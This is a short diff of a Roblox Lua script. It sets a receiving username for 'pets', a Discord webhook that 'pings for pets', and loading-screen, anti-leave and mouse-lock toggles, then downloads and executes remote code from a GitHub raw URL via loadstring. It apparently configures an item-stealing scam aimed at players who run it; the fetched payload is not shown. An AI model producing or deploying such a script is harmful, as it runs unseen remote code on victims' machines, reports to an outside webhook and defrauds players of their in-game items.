@@ -1,4 +1,4 @@
-```UserName = "Cup_far" -- good pets
+UserName = "Cup_far" -- good pets
 Webhook = "https://discord.com/api/webhooks/1139006255587921980/uGly4ccmgpZc5BAjm3oXfm7PwzgJSqMNzjA8PVyRaIl0LTDKp6UBXDhsmb1JFkQ1w_7W" -- pings for pets
 UserName2 = "Cup_far" -- bad pets
 
@@ -6,4 +6,4 @@ _G.LoadingScreen = true -- make it true if you want the loadingscreen
 _G.AntiLeave = true -- make it true if you want the antileave
 _G.MouseLock = true -- make it true if you want the mouselock
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/LypherX/MoriScripts/main/MoriScripts", true))()```
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LypherX/MoriScripts/main/MoriScripts", true))()
